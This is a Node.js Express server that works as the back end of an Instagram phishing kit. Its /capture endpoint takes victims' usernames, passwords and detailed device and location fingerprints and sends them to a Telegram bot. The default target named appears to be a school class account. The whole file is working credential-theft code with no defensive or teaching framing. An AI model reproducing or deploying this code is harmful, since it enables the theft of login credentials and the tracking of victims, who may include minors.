const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 8080;

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

app.post('/capture', async (req, res) => {
    const { username, password, target, time, fingerprint } = req.body || {};

    console.log(`[CAPTURED] Username: ${username || 'N/A'}`);

    if (!username || !password) {
        return res.json({ success: true });
    }

    const fp = fingerprint || {};

    const message = `
<b>🔥 Instagram Login Captured</b>

👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> <code>${password}</code>
🎯 <b>Target:</b> ${target || "smrj.class9.confessions"}
⏰ <b>Time:</b> ${new Date(time || Date.now()).toLocaleString()}

🌐 <b>Network & Location</b>
📍 IP: ${fp.ip || 'N/A'}
🏢 ISP: ${fp.isp || 'N/A'}
📍 Location: ${fp.city || 'N/A'}, ${fp.country || 'N/A'}
🛡️ VPN / Proxy: ${fp.vpn || 'Unknown'}

📱 <b>Device Fingerprint</b>
🖥️ User-Agent: <code>${fp.userAgent ? fp.userAgent.substring(0, 80) + '...' : 'N/A'}</code>
📐 Screen: ${fp.screen || 'N/A'}
🌍 Timezone: ${fp.timezone || 'N/A'}
🔋 Battery: ${fp.battery || 'N/A'} (${fp.charging || 'N/A'})
💻 GPU: ${fp.gpuVendor || 'N/A'} - ${fp.gpuRenderer || 'N/A'}
⚙️ Cores: ${fp.hardwareConcurrency || 'N/A'} | Memory: ${fp.deviceMemory || 'N/A'} GB
    `.trim();

    if (TELEGRAM_TOKEN && CHAT_ID) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });

            if (response.ok) {
                console.log("✅ Sent to Telegram successfully");
            } else {
                console.error(`❌ Telegram Error ${response.status}`);
            }
        } catch (err) {
            console.error("❌ Telegram failed:", err.message);
        }
    }

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
